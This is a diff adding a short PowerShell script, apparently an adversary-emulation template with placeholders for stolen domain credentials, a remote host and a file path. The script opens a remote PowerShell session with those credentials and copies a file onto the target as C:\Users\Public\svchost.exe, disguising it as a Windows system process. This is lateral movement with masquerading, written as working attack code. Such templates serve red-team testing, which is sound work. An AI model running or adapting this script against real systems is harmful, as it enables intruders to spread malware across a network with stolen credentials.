@@ -1,0 +1,14 @@
+$job = Start-Job -ScriptBlock {
+  $username = "#{domain.user.name}";
+  $password = "#{domain.user.password}";
+  $secstr = New-Object -TypeName System.Security.SecureString;
+  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+  $location = "#{location}";
+  $exe = "#{exe_name}";
+  Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+  Start-Sleep -s 5;
+  Remove-PSSession -Session $session;
+};
+Receive-Job -Job $job -Wait;
